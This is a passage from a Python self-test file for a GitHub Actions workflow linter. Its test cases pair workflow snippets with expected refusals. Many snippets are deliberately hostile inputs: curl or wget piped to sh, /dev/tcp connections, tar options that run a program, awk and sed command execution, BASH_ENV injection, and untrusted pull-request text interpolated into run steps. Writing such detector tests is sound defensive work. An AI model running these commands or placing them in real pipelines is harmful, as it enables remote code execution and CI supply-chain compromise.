    "r6: a tar option that runs a program in a fetch step is refused": (
        _r5_run("curl -fsSL -o f.tgz https://x.example/f.tgz\n          tar --to-command=sh -xf f.tgz"), None, 1, "fetch step"),
    "r6: a tar compress program in a fetch step is refused": (
        _r5_run("curl -fsSL -o f.tgz https://x.example/f.tgz\n          tar -I sh -xf f.tgz"), None, 1, "fetch step"),
    "r6: a here-document in a fetch step is refused": (
        _r5_run("curl -fsSL -o f https://x.example/f\n          echo <<EOF\n          hi\n          EOF"), None, 1, "fetch step"),
    "r6: a quoted fetch command is refused": (_r5_run("curl -fsSL -o f https://x.example/f\n          \"echo\" hi"), None, 1, "fetch step"),
    "r6: an operator in a secrets expression is refused": (_r5_run("echo ${{ secrets.A || 'x' }}"), None, 1, "interpolates"),
    "r6: a matrix path with extra segments is refused": (
        _r5_job(head="    strategy:\n      matrix:\n        os: [ubuntu-latest]\n",
                steps="    steps:\n      - run: echo ${{ matrix.os.x }}\n"), None, 1, "interpolates"),
    "r6: a steps path that is not outputs is refused": (
        _r5_job(steps="    steps:\n      - id: x\n        run: echo hi\n      - run: echo ${{ steps.x.env.y }}\n"), None, 1, "interpolates"),
    "r6: a PATH assignment in a fetch step is refused": (_r5_run("PATH=/x:$PATH curl -fsSL -o f https://x.example/f"), None, 1, "fetch step"),
    "r6: a GITHUB_ENV write in a fetch step is refused": (
        _r5_run("curl -fsSL -o f https://x.example/f\n          echo X=1 >> \"$GITHUB_ENV\""), None, 1, "fetch step"),
    "r6: a fetch step the scanner cannot read is refused": (_r5_run("curl -fsSL -o f \"https://x.example/f"), None, 1, "cannot read"),
    "r6: a step without a fetch word runs only the listed commands (Round 8, S8)": (_r5_run("python3 build.py\n          bash run-it"), None, 0, ""),
    "r6: a fetch word in a comment does not make a fetch step": (_r5_run("# curl is not used here\n          python3 build.py"), None, 0, ""),
    "r6: a hosted label passes": (_r5_job(head="    runs-on: ubuntu-24.04\n"), None, 0, ""),
    "r6: a self-hosted runner is refused": (_r5_job(head="    runs-on: self-hosted\n"), None, 1, "runs-on"),
    "r6: a runs-on expression is refused": (_r5_job(head="    runs-on: ${{ inputs.runner }}\n"), None, 1, "runs-on"),
    "r6: a runs-on list is refused": (_r5_job(head="    runs-on: [ubuntu-latest]\n"), None, 1, "runs-on"),
    "r6: a runs-on mapping is refused": (_r5_job(head="    runs-on:\n      group: big\n"), None, 1, "runs-on"),
    "r6: runs-on matrix.os of a hosted matrix passes": (
        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n"), None, 0, ""),
    "r6: runs-on matrix.os of a matrix with a self-hosted label is refused": (
        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, self-hosted]\n"), None, 1, "runs-on"),
    "r6: runs-on matrix.os without a matrix is refused": (_r5_job(head="    runs-on: ${{ matrix.os }}\n"), None, 1, "runs-on"),
    "r6: runs-on matrix.os of include entries passes": (
        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n          - os: macos-15-intel\n"),
        None, 0, ""),
    "r6: runs-on matrix.os of an include entry with a self-hosted label is refused": (
        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n          - os: self-hosted\n"),
        None, 1, "runs-on"),
    "r6: a workflow_call trigger is refused": ("on:\n  workflow_call:\n" + _r5_job(), None, 1, "workflow_call"),
    "r6: a pull_request_target trigger is refused": ("on:\n  pull_request_target:\n" + _r5_job(), None, 1, "pull_request_target"),
    "r6: a repository_dispatch trigger is refused": ("on:\n  repository_dispatch:\n" + _r5_job(), None, 1, "repository_dispatch"),
    "r6: a forbidden trigger in a list is refused": ("on: [push, workflow_call]\n" + _r5_job(), None, 1, "workflow_call"),
    "r6: a forbidden trigger in a block list is refused": ("on:\n  - push\n  - repository_dispatch\n" + _r5_job(), None, 1, "repository_dispatch"),
    "r6: a push trigger passes": ("on:\n  push:\n" + _r5_job(), None, 0, ""),
    "r6: a local action reached twice is walked once": (
        _r5_job(steps="    steps:\n" + R5_LOCAL + R5_LOCAL),
        _r5_act(_r5_comp("    - run: curl -fsSL https://x.example/i | sh\n      shell: bash\n")), 1, "fetch step"),
    "r5: curl piped to sh is refused": (_r5_run("curl -fsSL https://x.example/i.sh | sh"), None, 1, "fetch step"),
    "r5: wget piped to sudo bash is refused": (_r5_run("wget -qO- https://x.example/i.sh | sudo bash"), None, 1, "fetch step"),
    "r5: curl piped to python is refused": (_r5_run("curl -fsSL https://x.example/i.py | python3"), None, 1, "fetch step"),
    "r5: bash over a curl process substitution is refused": (_r5_run("bash <(curl -fsSL https://x.example/i.sh)"), None, 1, "fetch step"),
    "r5: sh -c over a curl substitution is refused": (_r5_run('sh -c "$(curl -fsSL https://x.example/i.sh)"'), None, 1, "fetch step"),
    "r5: a curl into a variable is refused (Round 8, S1: a download in a substitution has no name to check)": (
        _r5_run("x=$(curl -fsSL https://x.example/i)"), None, 1, "command substitution"),
    "r5: a curl piped to sha256sum passes": (_r5_run("curl -fsSL https://x.example/i | sha256sum"), None, 0, ""),
    "r5: a container by tag is refused": (_r5_job(head="    container: rust:latest\n"), None, 1, "`container` image"),
    "r5: a container by digest passes": (_r5_job(head="    container: rust@" + R5_DIGEST + "\n"), None, 0, ""),
    "r5: a container mapping by tag is refused": (_r5_job(head="    container:\n      image: rust:latest\n"), None, 1, "`container` image"),
    "r5: a container mapping without an image is refused": (_r5_job(head="    container:\n      options: --user root\n"), None, 1, "`container` image"),
    "r5: a container mapping by digest passes": (_r5_job(head="    container:\n      image: rust@" + R5_DIGEST + "\n"), None, 0, ""),
    "r5: services that are not a mapping are refused": (_r5_job(head="    services: pg\n"), None, 1, "`services` must be"),
    "r5: a service by tag is refused": (_r5_job(head="    services:\n      pg:\n        image: postgres:16\n"), None, 1, "services.pg.image"),
    "r5: a service without an image is refused": (_r5_job(head="    services:\n      pg:\n        ports: [5432]\n"), None, 1, "services.pg.image"),
    "r5: a service by digest passes": (_r5_job(head="    services:\n      pg:\n        image: postgres@" + R5_DIGEST + "\n"), None, 0, ""),
    "r5: jobs that are a scalar are refused": ("jobs: x\n", None, 1, "`jobs:` must be a non-empty mapping"),
    "r5: jobs that are empty are refused": ("jobs:\n", None, 1, "`jobs:` must be a non-empty mapping"),
    "r5: a job that is a scalar is refused": ("jobs:\n  a: x\n", None, 1, "a job must be a mapping"),
    "r5: needs as a mapping is refused": (_r5_job(head="    needs:\n      x: y\n"), None, 1, "`needs` must be"),
    "r5: needs as a list holding a mapping is refused": (_r5_job(head="    needs:\n      - a:\n          b: c\n"), None, 1, "`needs` must be"),
    "r5: needs as a string or a list of strings passes": (
        "jobs:\n  b:\n    needs: a\n    steps:\n" + R5_OK_RUN + "  c:\n    needs: [a, b]\n    steps:\n" + R5_OK_RUN + "  a:\n    steps:\n" + R5_OK_RUN, None, 0, ""),
    "r5: steps as a string are refused": (_r5_job(steps="    steps: do-it\n"), None, 1, "`steps` must be a non-empty list"),
    "r5: steps as a mapping are refused": (_r5_job(steps="    steps:\n      a: b\n"), None, 1, "`steps` must be a non-empty list"),
    "r5: steps with no value are refused": (_r5_job(steps="    steps:\n"), None, 1, "`steps` must be a non-empty list"),
    "r5: a job with no steps is refused": (_r5_job(steps="    timeout-minutes: 5\n"), None, 1, "`steps` must be a non-empty list"),
    "r5: a step that is a scalar is refused": (_r5_job(steps="    steps:\n      - just\n"), None, 1, "a step must be a mapping"),
    "r5: a reusable workflow job needs no steps": ("jobs:\n  a:\n    uses: o/r/.github/workflows/w.yml@" + "ab" * 20 + "\n", None, 0, ""),
}


R7_FETCH = "curl -fsSL -o f https://x.example/f"
R7_VERIFY = 'echo "${SUM}  f" | sha256sum -c -'


def _r7(*lines: str) -> str:
    """A one-step job whose run text is the given lines."""
    return _r5_run("\n          ".join(lines))


def _r7_steps(*blocks: str, head: str = "") -> str:
    """A job from whole step blocks (each a `      - ...` text ending in a newline)."""
    return _r5_job(head=head, steps="    steps:\n" + "".join(blocks))


R7_DIRTY_ENV = "        env:\n          T: ${{ github.event.pull_request.title }}\n"

R7_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
    # --- N1: commands inside an arithmetic expansion are scanned.
    "r7 N1: a command substitution inside $(( )) of a fetch step is refused": (_r7(R7_FETCH, ": $(( $(sh f) ))"), None, 1, "fetch step"),
    "r7 N1: a backtick command inside $(( )) of a fetch step is refused": (_r7(R7_FETCH, ": $(( `sh f` ))"), None, 1, "fetch step"),
    "r7 N1: a subshell written as $((cmd) ) of a fetch step is refused": (_r7(R7_FETCH, "$((sh f) )"), None, 1, "fetch step"),
    "r7 N1: a function definition in a fetch step is scanned": (_r7("f() { sh f; }", R7_FETCH), None, 1, "fetch step"),
    "r7 N1: a function definition holding a plain command passes": (_r7(R7_FETCH, "f() { echo hi; }"), None, 0, ""),
    "r7 F3: a curl piped to tar with no checksum check is refused (it passed in round 6)": (
        _r5_run("curl -fsSL https://x.example/i | tar xz\n          curl -fsSL https://x.example/i | sha256sum"), None, 1, "before a checksum check"),
    "r7 N1: plain arithmetic in a fetch step passes the scan": (_r7(R7_FETCH, "echo $(( 1 + 2 ))"), None, 0, ""),
    # --- N2: a braced GITHUB_ENV / GITHUB_PATH write is a write.
    "r7 N2: a braced GITHUB_ENV write in a fetch step is refused": (_r7(R7_FETCH, 'echo "X=1" >> "${GITHUB_ENV}"'), None, 1, "fetch step"),
    "r7 N2: a braced GITHUB_PATH write in a fetch step is refused": (_r7(R7_FETCH, 'echo "$PWD" >> ${GITHUB_PATH}'), None, 1, "fetch step"),
    # --- N3: wget options are an allow-list.
    "r7 N6: a local action that is a symlink loop is refused, not raised": (
        _r7_steps("      - uses: ./loop\n"), {"loop": "\0symlink:loop"}, 1, "local action"),
    "r7 N2: a fetched file copied over GITHUB_ENV after the checksum check is refused": (
        _r7(R7_FETCH, R7_VERIFY, 'cp f "$GITHUB_ENV"'), None, 1, "GITHUB_ENV"),
    "r7 F3: tar with a short option that runs a program is refused after the checksum check": (
        _r7(R7_FETCH, R7_VERIFY, "tar -I sh -xf f"), None, 1, "tar option"),
    "r7 F3: tar with a long option that runs a program is refused after the checksum check": (
        _r7(R7_FETCH, R7_VERIFY, "tar -xf f --to-command=sh"), None, 1, "tar option"),
    "r7 F5: an exec descriptor opened on a split /dev/tcp path is refused": (
        _r7('exec 3<>"/dev/t""cp/x.example/80"'), None, 1, "network connection"),
    "r7 F5: python -c without a network word is refused by the run allow-list (Round 8, S8)": (
        _r7("python3 -c 'import os; os.system(\"true\")'"), None, 1, "not a script file"),
    "r7 N3: wget --use-askpass in a fetch step is refused": (_r7("wget --use-askpass=./x -O f https://x.example/f"), None, 1, "wget"),
    "r7 N3: wget -e use_askpass in a fetch step is refused": (_r7("wget -e use_askpass=./x -O f https://x.example/f"), None, 1, "wget"),
    "r7 N3: wget --execute in a fetch step is refused": (_r7("wget --execute=use_askpass=./x -O f https://x.example/f"), None, 1, "wget"),
    "r7 N3: a plain wget -q -O passes the option check": (_r7("wget -q -O f https://x.example/f", R7_VERIFY), None, 0, ""),
    # --- N4 / F4: the shell of a step, a job and a workflow.
    "r7 N4: a step shell of pwsh is refused": (_r7_steps("      - run: echo ok\n        shell: pwsh\n"), None, 1, "`shell: pwsh`"),
    "r7 N4: a step shell of python is refused": (_r7_steps("      - run: echo ok\n        shell: python\n"), None, 1, "`shell: python`"),
    "r7 N4: a step shell with a custom template is refused": (_r7_steps("      - run: echo ok\n        shell: bash {0}\n"), None, 1, "not allowed"),
    "r7 N4: a step shell of bash passes": (_r7_steps("      - run: echo ok\n        shell: bash\n"), None, 0, ""),
    "r7 N4: a job defaults.run.shell of pwsh is refused": (_r7_steps(R5_OK_RUN, head="    defaults:\n      run:\n        shell: pwsh\n"), None, 1, "defaults.run.shell"),
    "r7 N4: a workflow defaults.run.shell of pwsh is refused": ("defaults:\n  run:\n    shell: pwsh\n" + _r5_job(), None, 1, "defaults.run.shell"),
    "r7 F4: a run on a Windows runner with no shell is refused": (_r7_steps(R5_OK_RUN, head="    runs-on: windows-latest\n"), None, 1, "no `shell:`"),
    "r7 F4: a run on a Windows runner with shell bash passes": (_r7_steps("      - run: echo ok\n        shell: bash\n", head="    runs-on: windows-latest\n"), None, 0, ""),
    # --- N5 / F1: taint through job env, workflow env, set-output, GITHUB_ENV, files and `with:`.
    "r7 N5: a job env value feeding a GITHUB_OUTPUT writer taints it": (
        _r7_steps("      - id: x\n        run: echo \"y=$T\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n",
                  head="    env:\n      T: ${{ github.event.pull_request.title }}\n"), None, 1, "interpolates"),
    "r7 F1: a workflow env value feeding a GITHUB_OUTPUT writer taints it": (
        "env:\n  T: ${{ github.event.pull_request.title }}\n" + _r7_steps(
            "      - id: x\n        run: echo \"y=$T\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
    "r7 N5: a value relayed through GITHUB_ENV taints a later writer": (
        _r7_steps("      - run: echo \"V=$T\" >> \"$GITHUB_ENV\"\n" + R7_DIRTY_ENV,
                  "      - id: x\n        run: echo \"y=$V\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
    "r7 F1: a legacy ::set-output writer with an untrusted env is tainted": (
        _r7_steps("      - id: x\n        run: echo \"::set-output name=y::$T\"\n" + R7_DIRTY_ENV, "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
    "r7 F1: a value relayed through a file taints a later writer": (
        _r7_steps("      - run: echo \"$T\" > val.txt\n" + R7_DIRTY_ENV,
                  "      - id: x\n        run: echo \"y=$(cat val.txt)\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
    "r7 F1: a uses step with an untrusted with value has tainted outputs": (
        _r7_steps("      - id: u\n        uses: " + CHECKOUT_USES + "\n        with:\n          ref: ${{ github.event.pull_request.head.ref }}\n",
                  "      - run: echo ${{ steps.u.outputs.ref }}\n"), None, 1, "interpolates"),
    "r7 F1: a uses step with a literal with value is still refused in run text (Round 8, S3)": (
        _r7_steps("      - id: u\n        uses: " + CHECKOUT_USES + "\n        with:\n          ref: main\n", "      - run: echo ${{ steps.u.outputs.ref }}\n"), None, 1, "`uses:` step"),
    # --- F2: a matrix value of any job but release.yml's release job is a literal.
    "r7 F2: an expression matrix value in a job is refused": (
        _r7_steps("      - run: echo ${{ matrix.os }}\n", head="    strategy:\n      matrix:\n        os: ${{ fromJSON(github.event.pull_request.title) }}\n"), None, 1, "strategy.matrix"),
    "r7 F2: an expression inside a matrix list is refused": (
        _r7_steps("      - run: echo ${{ matrix.os }}\n", head="    strategy:\n      matrix:\n        os: [\"${{ github.head_ref }}\"]\n"), None, 1, "strategy.matrix"),
    # --- F3: a downloaded file is checked before it is unpacked, moved or run.
    "r7 F3: a tar of a download with no checksum is refused": (_r7(R7_FETCH, "tar xzf f"), None, 1, "checksum"),
    "r7 F3: a curl piped to tar with no checksum is refused": (_r7("curl -fsSL https://x.example/f | tar xz"), None, 1, "tar"),
    "r7 F3: a tar after a checksum check passes": (_r7(R7_FETCH, R7_VERIFY, "tar xzf f"), None, 0, ""),
    "r7 F3: a checksum check inside an if does not count": (_r7(R7_FETCH, "if " + R7_VERIFY.split(" | ")[0] + " | sha256sum -c -; then :; fi", "tar xzf f"), None, 1, "checksum"),
    "r7 F3: a checksum check ended by || true does not count": (_r7(R7_FETCH, R7_VERIFY + " || true", "tar xzf f"), None, 1, "checksum"),
    "r7 F3: set +e in a fetch step is refused": (_r7("set +e", R7_FETCH, R7_VERIFY, "tar xzf f"), None, 1, "fetch step"),
    "r7 F3: a download written over a command name is refused": (_r7("curl -fsSL -o sha256sum https://x.example/f", R7_VERIFY), None, 1, "command name"),
    "r7 F3: a download written to the system bin directory is refused": (_r7("curl -fsSL -o /usr/local/bin/tool https://x.example/f"), None, 1, "bin directory"),
    "r7 F3: a later step that runs a downloaded file with no checksum is refused": (
        _r7_steps("      - run: " + R7_FETCH + "\n", "      - run: chmod +x f && bash f\n"), None, 1, "downloaded"),
    "r7 F3: a later step with a word that merely starts with the file name passes": (
        _r7_steps("      - run: " + R7_FETCH + "\n", "      - run: echo foo\n"), None, 0, ""),
    "r7 F3: a later step that checks the downloaded file passes": (
        _r7_steps("      - run: " + R7_FETCH + "\n", "      - run: |\n          " + R7_VERIFY + "\n          tar xzf f\n"), None, 0, ""),
    # --- F5: a download that no fetch word names.
    "r7 F5: a /dev/tcp redirect is refused": (_r7("exec 3<>/dev/tcp/x.example/80", "echo ok"), None, 1, "/dev/tcp"),
    "r7 F5: a /dev/tcp read is refused": (_r7("cat < /dev/tcp/x.example/80 > f"), None, 1, "/dev/tcp"),
    "r7 F5: python urllib in -c is refused": (_r7("python3 -c 'import urllib.request as u; u.urlretrieve(\"https://x.example/f\", \"f\")'", "sh f"), None, 1, "fetch step"),
    "r7 F5: python -m urllib.request is refused": (_r7("python3 -m urllib.request https://x.example/f", "sh f"), None, 1, "fetch step"),
    "r7 F5: gh release download then a run is refused": (_r7("gh release download v1 -p f", "sh f"), None, 1, "allow-list"),
    "r7 F5: docker run of a tag-only image is refused": (_r7("docker run --rm alpine:3 sh -c ls"), None, 1, "allow-list"),
    "r7 F5: docker pull is refused": (_r7("docker pull alpine:3"), None, 1, "allow-list"),
    "r7 F5: docker run of a digest-pinned image passes": (_r7("docker run --rm alpine@" + R5_DIGEST + " ls"), None, 0, ""),
    "r7 F5: gh attestation verify is not a fetch": (_r7("gh attestation verify f --repo o/r", "bash f"), None, 0, ""),
    # --- N6: depth counts on the resolved path; a walked action is still depth-checked; a loop is refused.
    "r7 N6: a deep chain reached after a shallow visit is still refused": (
        _r5_job(steps="    steps:\n      - uses: ./n2\n      - uses: ./n0\n"), {**{"n%d/action.yml" % k: _r5_comp(("    - uses: ./n%d\n" % (k + 1)) if k < 9 else "    - run: echo ok\n      shell: bash\n") for k in range(10)}}, 1, "nests more than"),
    "r7 N6: the same shallow action used twice passes": (
        _r5_job(steps="    steps:\n" + R5_LOCAL + R5_LOCAL), _r5_act(_r5_comp("    - run: echo ok\n      shell: bash\n")), 0, ""),
    "r7 F3: a verify behind false && does not count": (_r7(R7_FETCH, "false && " + R7_VERIFY, "tar xzf f"), None, 1, "own checksum check"),
    "r7 F3: a negated verify does not count": (_r7(R7_FETCH, "! " + R7_VERIFY, "tar xzf f"), None, 1, "own checksum check"),
    "r7 F3: a verify inside a subshell does not count": (_r7(R7_FETCH, "(" + R7_VERIFY + ")", "tar xzf f"), None, 1, "own checksum check"),
    "r7 F3: verify && tar passes": (_r7(R7_FETCH, R7_VERIFY + " && tar xzf f"), None, 0, ""),
    "r7 F3: tar into the bin directory after a verify passes": (_r7(R7_FETCH, R7_VERIFY, "tar xzf f -C /usr/local/bin nfpm"), None, 0, ""),
    "r7 F3: a URL that names a bin directory passes": (_r7("curl -fsSL -o f https://x.example/usr/bin/tool", R7_VERIFY), None, 0, ""),
    "r7 F3: a redirect to a computed path in a fetch step is refused": (_r7(R7_FETCH, "echo x > $HOME/f"), None, 1, "computed path"),
    "r7 F1: a relay through a script the scanner cannot read taints a later writer": (
        _r7_steps("      - run: echo \"$T\" >> x; echo )\n" + R7_DIRTY_ENV,
                  "      - id: x\n        run: echo \"y=1\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 2, "interpolates"),
    "r7 N5: a job env of allowed expressions keeps clean outputs": (
        _r7_steps("      - id: x\n        run: echo \"y=$S\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n",
                  head="    env:\n      S: ${{ secrets.TOKEN }}\n"), None, 0, ""),
    "r7 F4: a Windows matrix leg with no shell is refused": (
        _r7_steps(R5_OK_RUN, head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [windows-latest]\n"), None, 1, "no `shell:`"),
    "r7 F4: a Windows job whose default shell is bash passes": (
        _r7_steps(R5_OK_RUN, head="    runs-on: windows-latest\n    defaults:\n      run:\n        shell: bash\n"), None, 0, ""),
    "r7 F5: docker run of a locally built image passes": (
        _r7_steps("      - uses: " + IMAGE_BUILD_USES + "\n        with:\n          load: true\n          tags: ai-memory-ci:verify\n",
                  "      - run: docker run --rm ai-memory-ci:verify ls\n"), None, 0, ""),
    "r7 F5: docker run of an image the build step did not load is refused": (
        _r7_steps("      - uses: " + IMAGE_BUILD_USES + "\n        with:\n          load: false\n          tags: ai-memory-ci:verify\n",
                  "      - run: docker run --rm ai-memory-ci:verify ls\n"), None, 1, "allow-list"),
}


def r5_errors(doc_text: str, files: Optional[Dict[str, str]], tree: Path) -> List[str]:
    """Run the Round-5 checks on one document (and, for ``files`` not None, a tree holding those files)."""
    if tree.exists():
        shutil.rmtree(tree)
    tree.mkdir(parents=True)
    for rel, text in (files or {}).items():
        (tree / rel).parent.mkdir(parents=True, exist_ok=True)
        if text.startswith("\0symlink:"):  # a symlink to the named path, resolved against the tree
            (tree / rel).symlink_to(text[len("\0symlink:"):])
        else:
            (tree / rel).write_text(text, encoding="utf-8")
    rep = Report()
    rep.root = tree if files is not None else None
    doc = parse_yaml(doc_text, "w.yml", rep)
    if doc is not None:
        check_uses_pinned(doc, "w.yml", rep)
    return rep.errors


def unit_checks() -> int:
    """Pure-function cases: logical_lines parity with BuildKit, noise detection, scalar decoding."""
    failures = 0
    for lines, bk, want in PARITY:
        got = tuple(logical_lines(list(lines), buildkit=bk))
        if got != want:
            print(f"self-test FAIL: logical_lines({list(lines)}, buildkit={bk}) = {list(got)}, wanted {list(want)}", file=sys.stderr)
            failures += 1
    if continuation_noise(["RUN a \\", "", "# c", "b", "# d"]) != [2, 3]:
        print("self-test FAIL: continuation_noise misses a blank or comment inside a continuation", file=sys.stderr)
        failures += 1
    if continuation_noise(["# a", "", "RUN a \\", "b", "", "# d"]):
        print("self-test FAIL: continuation_noise flags a line outside a continuation", file=sys.stderr)
        failures += 1
    if bk_instructions(list(DOCKER_RUN_LINES)) != [(1, len(DOCKER_RUN_LINES), DOCKER_RUN)]:
        print("self-test FAIL: DOCKER_RUN_LINES does not join to DOCKER_RUN", file=sys.stderr)
        failures += 1
    for doc, key, want in SCALARS:
        rep = Report()
        node = parse_yaml(doc, "scalar", rep)
        got: Optional[str] = None
        if node is not None and not rep.errors:
            val = node.get(key)
            got = val.text() if val is not None else None
        if got != want:
            print(f"self-test FAIL: scalar {doc!r} decoded {got!r}, wanted {want!r}", file=sys.stderr)
            failures += 1
    return failures


def _r8(*lines: str) -> str:
    return _r7(*lines)


R8_TOOL = "      - run: curl -fsSL -o tool https://x.example/tool\n"
R8_MATRIX = "    strategy:\n      matrix:\n        k: [%s]\n"

# Round 8 (security S1-S9 and code C1-C6 of r7, vote 6def5ab6): (document, files, message count, needle).
R8_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
    # --- S5: a defaults or defaults.run that is not a mapping hides the shell.
    "r8 S5: a scalar defaults.run is refused": (_r7_steps("      - run: echo ok\n", head="    defaults:\n      run: pwsh\n"), None, 1, "defaults.run"),
    "r8 S5: a scalar defaults is refused": (_r7_steps("      - run: echo ok\n", head="    defaults: pwsh\n"), None, 1, "defaults.run"),
    "r8 S5: a mapping defaults.run with bash passes": (_r7_steps("      - run: echo ok\n", head="    defaults:\n      run:\n        shell: bash\n"), None, 0, ""),
    # --- S6: BASH_ENV and ENV through an env mapping, at the workflow, job and step level.
    "r8 S6: a job env BASH_ENV is refused": (_r7_steps("      - run: echo ok\n", head="    env:\n      BASH_ENV: ./rc\n"), None, 1, "BASH_ENV"),
    "r8 S6: a step env BASH_ENV is refused": (_r7_steps("      - run: echo ok\n        env:\n          BASH_ENV: ./rc\n"), None, 1, "BASH_ENV"),
    "r8 S6: a workflow env ENV is refused": ("env:\n  ENV: ./rc\n" + _r7("echo ok"), None, 1, "`ENV`"),
    "r8 S6: an env of an ordinary name passes": (_r7_steps("      - run: echo ok\n        env:\n          NAME: v\n"), None, 0, ""),
    # --- S4: a literal matrix value that reaches run text is scanned like run text.
    "r8 S4: a matrix value that runs a downloader is refused": (_r7_steps("      - run: echo ${{ matrix.k }}\n", head=R8_MATRIX % "'x; pip install y'"), None, 1, "matrix value"),
    "r8 S4: a matrix include value that runs a downloader is refused": (
        _r7_steps("      - run: echo ${{ matrix.k }}\n", head="    strategy:\n      matrix:\n        include:\n          - k: 'x; pip install y'\n"), None, 1, "matrix value"),
    "r8 S4: a plain matrix value passes": (_r7_steps("      - run: echo ${{ matrix.k }}\n", head=R8_MATRIX % "a, b"), None, 0, ""),
    # --- S3: an output of a `uses:` step is never safe in run text; an output of a `run:` step is.
    "r8 S3: a run step output passes": (_r7_steps("      - id: r\n        run: echo \"v=1\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.r.outputs.v }}\n"), None, 0, ""),
    # --- S8: every command word of a `run:` is in the allow-list and meets the policy of its tool.
    "r8 S8: pip is not listed": (_r8("pip install requests"), None, 1, "allow-list"),
    "r8 S8: sudo pip is not listed": (_r8("sudo pip install requests"), None, 1, "allow-list"),
    "r8 S8: timeout with a bad duration is refused": (_r8("timeout soon echo ok"), None, 1, "timeout"),
    "r8 S8: timeout of a listed command passes": (_r8("timeout 30 echo ok"), None, 0, ""),
    "r8 S8: xargs of an unlisted command is refused": (_r8("echo a | xargs -r npm"), None, 1, "allow-list"),
    "r8 S8: a computed command word is refused": (_r8("X=cu", "${X}rl https://x.example/i"), None, 1, "computed"),
    "r8 S8: a function that replaces a listed command is refused": (_r8("curl() { echo no; }", "curl https://x.example/i"), None, 1, "function"),
    "r8 S8: a function the text defines and calls passes": (_r8("f() { echo hi; }", "f"), None, 0, ""),
    "r8 S8: bash -c is refused": (_r8("bash -c 'echo ok'"), None, 1, "script file"),
    "r8 S8: bash of a repository script passes": (_r8("bash scripts/x.sh --flag"), None, 0, ""),
    "r8 S8: bash of a parent path is refused": (_r8("bash ../x.sh"), None, 1, "script file"),
    "r8 S8: python3 -m is refused": (_r8("python3 -m http.server"), None, 1, "script file"),
    "r8 S8: python3 of a script passes": (_r8("python3 -I scripts/x.py"), None, 0, ""),
    "r8 S8: source of an absolute path is refused": (_r8("source /etc/x.sh"), None, 1, "script file"),
    "r8 S8: git remote is not listed": (_r8("git remote prune o"), None, 1, ""),
    "r8 S8: git with a global option is refused": (_r8("git -c core.sshCommand=x fetch origin"), None, 1, "global option"),
    "r8 S8: git fetch of a URL is refused": (_r8("git fetch https://x.example/r.git"), None, 1, "URL"),
    "r8 S8: git config of another key is refused": (_r8("git config core.sshCommand x"), None, 1, "user.name"),
    "r8 S8: git config user.name passes": (_r8("git config user.name x"), None, 0, ""),
    "r8 S8: git upload-pack option is refused": (_r8("git fetch --upload-pack=x origin"), None, 1, "runs a program"),
    "r8 S8: git fetch of a remote name passes": (_r8("git fetch --no-tags origin main"), None, 0, ""),
    "r8 S8: cargo run is not listed": (_r8("cargo run"), None, 1, "RUN_CARGO"),
    "r8 S8: cargo --config is refused": (_r8("cargo --config x build"), None, 1, "--config"),
    "r8 S8: cargo install of another crate is refused": (_r8("cargo install evil --locked --version 1.0.0"), None, 1, "cargo install"),
    "r8 S8: cargo install without a pinned version is refused": (_r8("cargo install cbindgen --locked"), None, 1, "cargo install"),
    "r8 S8: cargo install of a listed crate passes": (_r8("cargo install --locked cbindgen --version 0.29.4"), None, 0, ""),
    "r8 S8: cargo build passes": (_r8("cargo build --release --features sal"), None, 0, ""),
    "r8 S8: gh release is refused": (_r8("gh release view v1"), None, 1, "gh"),
    "r8 S8: gh api passes": (_r8("gh api repos/o/r"), None, 0, ""),
    "r8 S8: openssl s_client is refused": (_r8("openssl s_client -connect x.example:443"), None, 1, "RUN_OPENSSL"),
    "r8 S8: openssl rand passes": (_r8("openssl rand -hex 8"), None, 0, ""),
    "r8 S8: pipx install of another package is refused": (_r8("pipx install evil"), None, 1, "RUN_PIPX"),
    "r8 S8: pipx install of copr-cli passes": (_r8("pipx install copr-cli"), None, 0, ""),
    "r8 S8: apt-get install of another package is refused": (_r8("sudo apt-get install -y evil"), None, 1, "apt-get"),
    "r8 S8: apt-get install of a listed package passes": (_r8("sudo apt-get install -y pipx rpm"), None, 0, ""),
    "r8 S8: awk system call is refused": (_r8("awk 'BEGIN{system(\"id\")}'"), None, 1, "awk"),
    "r8 S8: awk print passes": (_r8("echo a | awk '{print $1}'"), None, 0, ""),
    "r8 S8: sed execute flag is refused": (_r8("echo a | sed 's/a/id/e'"), None, 1, "sed"),
    "r8 S8: sed substitution passes": (_r8("echo a | sed 's/a/b/'"), None, 0, ""),
    "r8 S8: a listed tool given a URL is refused": (_r8("rpm -i https://x.example/p.rpm"), None, 1, "URL argument"),
    "r8 S8: a whole run from a secret passes": (_r5_job(steps="    steps:\n      - run: ${{ secrets.CMD }}\n"), None, 0, ""),
    "r8 S8: a whole run from a matrix value is refused": (_r7_steps("      - run: ${{ matrix.k }}\n", head=R8_MATRIX % "'echo ok'"), None, 1, "computed"),
    # --- C3 / C4 / C5: attached python module, docker forms, gh.
    "r8 C3: python3 with an attached module is refused": (_r8("python3 -murllib.request https://x.example/f"), None, 1, "script file"),
    "r8 C4: docker container run is refused": (_r8("docker container run --rm alpine:3 id"), None, 1, "RUN_DOCKER"),
    "r8 C4: docker image pull is refused": (_r8("docker image pull alpine:3"), None, 1, "RUN_DOCKER"),
